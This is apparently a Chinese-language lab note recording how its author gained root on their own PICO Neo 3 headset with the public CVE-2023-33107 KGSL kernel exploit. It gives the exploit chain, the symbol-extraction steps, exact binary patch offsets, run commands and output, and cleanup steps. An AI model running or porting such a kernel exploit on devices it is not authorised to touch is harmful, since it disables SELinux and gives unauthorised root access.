# 06 · 免解 BL 保数据 root（CVE-2023-33107 / picohaxx）

> 目的：拿到头显 root，**不解 Bootloader、不恢复出厂、不动 userdata**。
> 工具：`src/windows/picohaxx.neo3.bin`（由 `get_deps.ps1` 自动拉取并打补丁，已适配 Neo 3）。
> 状态：**2026-10-04 已在本机 PICO Neo 3 上实测成功**。

## ⚠️ 本机没有「原生 adb root」捷径（实测）

设备带 PICO 自家的属性：

```
persist.pvr.adb.root = 1        ← 只是个标记，不代表 adbd 以 root 跑
ro.pvr.adb_noauth    = 1        ← adb 免授权（所以 adb connect 不用配对）
```

实测 `picohaxx -unroot` 之后：

```
uid=2000(shell)   Enforcing   service.adb.root=0   adbd 属主=shell
```

⇒ **`persist.pvr.adb.root=1` 不会让 adbd 以 root 运行**，picohaxx 每次开机都必需，没有捷径。

## ⚠️ 陷阱：picohaxx 会让无线 adb 掉线

`root.c` 的 `patch_ADBD()`：

```c
system_resetprop(NULL, "-n", "service.adb.root", "1", NULL);
system_magiskpolicy(NULL, "--live", "allow adbd adbd process setcurrent", ...);
system("setprop persist.adb.tcp.port 5555");     // ← 只设 persist
kill_adbd();                                      // ← pkill -9 adbd
```

**问题**：`adbd` 启动时读的是**易失**的 `service.adb.tcp.port`（或 `persist.adb.tcp.port`），
而 picohaxx 只设了 `persist.*`。`pkill -9 adbd` 之后 USB gadget 也要重新枚举
⇒ **无线 adb 与 USB adb 会一起断**，且从设备本机（Termux）尤其难恢复。

### 实测（logcat 证据）

```
04:15:11.557  PICOHAXX: patching adbd...
04:15:11.610  SELinux: policy capability ...            ← magiskpolicy --live
04:15:12.567  PICOHAXX: setting persist.adb.tcp.port to 5555...
04:15:12.579  KERNEL: avc: denied { set } for property=persist.adb.tcp.port
                       scontext=u:r:su:s0               ← ★ 这个 setprop 被 SELinux 拒了
04:15:12.604  PICOHAXX: restarting adbd...
04:15:12.732  AdbDebuggingManager: Read failed with count -1
```

**但是**（重要更正）：

- **`adb tcpip 5555` 本身没问题**（实测单独跑：adbd 重启后仍以 root 跑、仍监听 `:::5555`）
- **从 PC 走 TCP 跑 picohaxx 也没问题**（实测成功：`uid=0(root)`、adbd root、TCP 正常）
- **只有「在 Termux 里跑 adb」这条路会卡住**（adb 客户端在设备本机、走 loopback，
  adbd 重启后条目变 `offline`，`disconnect`+`connect` 重试 6 次仍连不回）

### 结论：不要用 adb，改用 picohaxx 自带的 root 执行能力

`picohaxx -noftpd -- <cmd>` 会以 root 执行 `<cmd>`（实测 `execve argv[]` 确认）。
⇒ **Termux 里直接一条命令搞定「提权 + 注入」**，完全不碰 adb：

```sh
~/picohaxx -noftpd -- /data/local/tmp/start_touch.sh
```

详见 `src/termux/`。

### 另外两个坑（实测）

**① `patch_ADBD()` 末尾 `exit(21)`** —— `kill_adbd()` 就是 `system("pkill -9 adbd"); exit(21);`
⇒ **第一次跑（原本没 root）时，`picohaxx -- <cmd>` 的 `<cmd>` 根本不会执行**。
必须分两步：先 `picohaxx -noftpd` 提权，再 `picohaxx -noftpd -- <cmd>`（第二次已是 root，跳过补丁）。

**② app 域读不到 `settings`，而 fallback 是坏的** —— Termux 里跑会：

```
[*] Device Firmware Version: cmd: Failure calling service settings: Failed transaction (2147483646)
[-] Unsupported Firmware version!
```

源码的 fallback 读 `ro.pvr.internal.version` 并把 `_` 换 `-`，
但**编译版实测返回空串**（`Device Firmware Version: ` 后直接 Unsupported）。
⇒ 用 **PATH shim**（假 `settings` 直接吐版本串）绕过。
另外已把 `offsets.h` 表串改成只留 build 时间戳 `202409100313`，
这样短横线/下划线两种形式都能 `strstr` 命中（原表只有短横线形式）。

## 结论

`github.com/264312431/picohaxx` 是可用方案。原作者只标了 PICO 4，**Neo 3 需要一处适配**（见下）。

- 漏洞：Qualcomm Adreno/KGSL IOMMU 整数溢出（`kgsl_ioctl_gpuobj_import` / `kgsl_ioctl_map_user_mem` + `KGSL_USER_MEM_TYPE_ADDR`）
- 链：rbtree 插入 BOGUS 条目 → 竞态 `mmap` → IOMMU PTE 悬垂 → 释放页被 `task_struct` 复用 → GPU 命令读写 → 覆写 `task_struct->addr_limit = KERNEL_DS`
- 官方补丁在 `clo/la/kernel/msm-4.19`，2023-10 才修；本机 `ro.build.version.security_patch = 2021-04-05` ⇒ 必然未修
- 攻击面：`/dev/kgsl-3d0` 是 `crw-rw-rw-`，`shell` 域可直接 `open` ⇒ 不需要 app、不需要 usb 调试以外的任何前置

**不改磁盘**：`patch_ADBD` 用 `resetprop -n`（内存属性）+ `magiskpolicy --live`（内存策略），重启即失效。
唯一会落盘的是 `setprop persist.adb.tcp.port 5555` —— 这条**是有意保留的**
（开发者设置里本来也开着无线 adb，本质就是同一个属性），它让重启后无线 adb 自动可用。

## Neo 3 适配（唯一的改动）

picohaxx 的 `offsets.h` 表是 PICO 4 的，`selinux_state` 硬编码 `0xffffff800aabb000`。
Neo 3 是另一个构建，需要换成 **`0xffffff800aab5000`**。

取符号的方法（无需 root）：

1. 官方 OTA：`https://alistatic.pui.picovr.com/5.9.9-202409100313-RELEASE-user-neo3-b5349-37aaf2be54.zip`（PICO OS 官网选「PICO Neo3 企业版/Pro/Pro Eye」）
2. `remotezip` 取 `boot.img`（96 MB）→ Android boot v2 header（`page=4096`）→ kernel 在 `offset=4096`，`kernel_size=35172368`
3. 是 **未压缩的 raw arm64 `Image`**（magic `ARMd`，`text_offset=0x80000`）
4. `uv run --with vmlinux-to-elf vmlinux-to-elf kernel.bin out.elf` → 122017 个符号，基址自动猜为 `0xffffff8008080000`

交叉验证：OTA 内核 build 串 `#1 SMP PREEMPT Tue Sep 10 04:33:49 CST 2024` 与设备 `uname -v` **逐字一致**。

### 符号对照

| 符号                         | Neo 3（链接期）          | picohaxx 表（PICO 4） |                |
| ---------------------------- | ------------------------ | --------------------- | -------------- |
| `_text`                      | `0xffffff8008080000`     | `0xffffff8008080000`  | ✅ 同          |
| `kptr_restrict`              | `0xffffff800a018ea0`     | `0xffffff800a018ea0`  | ✅ 同          |
| `sysctl_perf_event_paranoid` | `0xffffff800a00c1d4`     | `0xffffff800a00c1d4`  | ✅ 同          |
| `selinux_state`              | **`0xffffff800aab5000`** | `0xffffff800aabb000`  | ❌ 差 `0x6000` |

⇒ **只需改表里一项**。

### 二进制补丁（预编译 `picohaxx`，未 strip，1478056 B）

| 文件偏移   | 原值                 | 新值                           | 说明          |
| ---------- | -------------------- | ------------------------------ | ------------- |
| `0x34b6`   | `5.9.9-202408300028` | **`202409100313`**（NUL 补位） | 见下          |
| `0x164ef8` | `0xffffff800aabb000` | `0xffffff800aab5000`           | selinux_state |

（`0x164ef8` = `.data.rel.ro` 段 vaddr `0x166ef8` → file offset；表项 `{char* fw_ver; u64 selinux_state;}` 每项 16 字节）

**为什么表串只留 `202409100313`**：picohaxx 有两条识别路径，分隔符不一样 ——

| 路径                                                        | 取到的串                                     | 分隔符 |
| ----------------------------------------------------------- | -------------------------------------------- | ------ |
| `settings get system confirm_smartisan_version`（shell 域） | `5.9.9-202409100313-RELEASE-user-neo3-b5349` | `-`    |
| fallback `ro.pvr.internal.version`（app 域）                | `..._sv5.9.9_202409100313_neo3_b5349_user`   | `_`    |

原表只有短横线形式 ⇒ app 域下永远匹配不上（见下文坑 ②）。
改成只留 build 时间戳后，`strstr` 对**两种形式都能命中**，一条补丁解决两条路。

**已实测两种路径都匹配成功**（`[+] Offsets matched: 202409100313`）。

## 实测记录

```
$ ./picohaxx -v
[*] Device Firmware Version: 5.9.9-202409100313-RELEASE-user-neo3-b5349
[+] Offsets matched: 5.9.9-202409100313
seOffset: 0xffffff800aab5001        ← selinux_state + 1，与内核符号一致

$ ./picohaxx -noftpd -- /system/bin/id
✅ FOUND OUR TASK in 1431 hops at phys 0x0000000178DCBF00 !!
[+] Detected task_struct Epoch 3 layout (FW 5.9 - 5.11+)
[5] Patching UID and CAPS in-place.
⌛ [50460.640 ms] TOTAL
uid=0(root) ... context=u:r:su:s0
```

- 耗时约 **50 秒**（含 UAF 竞态重试 + 1431 跳 task walk）。`-dbg` 会明显更慢。
- 之后 `adb shell` 默认即 `uid=0(root)`。
- **KASLR 确实生效**（`kernel_slide = 0x1d65800000`），但 `KallSym2Phys` 只用相对偏移 ⇒ 不受影响。
- 设备侧读到的 kallsyms（patch 后 `kptr_restrict=0` 可读）确认所有**相对偏移**与提取值完全一致。
- `kernelbase_phys = 0xA0080000` 对 Neo 3 **也正确**（由 `selinux_state` 写入生效反证）。

## 副作用与清理

| 项                                                                          | 性质                   | 处理                                        |
| --------------------------------------------------------------------------- | ---------------------- | ------------------------------------------- |
| SELinux → Permissive（`selinux_enforcing=0`）                               | 内存                   | 重启恢复                                    |
| `kptr_restrict=0`、`sysctl_perf_event_paranoid=1`                           | 内存                   | 重启恢复                                    |
| `ro.debuggable=1`、`ro.boot.verifiedbootstate=orange`、`service.adb.root=1` | 内存（`resetprop -n`） | 重启恢复                                    |
| `persist.adb.tcp.port=5555`                                                 | **落盘**               | 已清除（`setprop persist.adb.tcp.port ''`） |
| `/data/local/tmp/{picohaxx,haxx.log,haxx2.log,pte_dummy}`                   | 落盘                   | 可删                                        |
| 内核 WARN `arm_lpae_init_pte+0x98`（`io-pgtable-arm.c:406`）                | 日志                   | 设计内，利用路径必经；无 panic/oops         |

**userdata 完好**：`/sdcard` 28 项、`/data/data` 202 项、第三方包 13 个，未恢复出厂。

## 备注

- 默认模式会开 `persist.adb.tcp.port=5555` + root ftpd(21)。局域网环境务必事后清除/不用 ftpd（`-noftpd`）。
- 想撤销：`./picohaxx -unroot`。
- 不想改 adbd 就跑 `-noadbd -noftpd -- <cmd>`，每次 ~50 秒。
- 换固件（升级/降级）后 `selinux_state` 会变，必须重取符号。
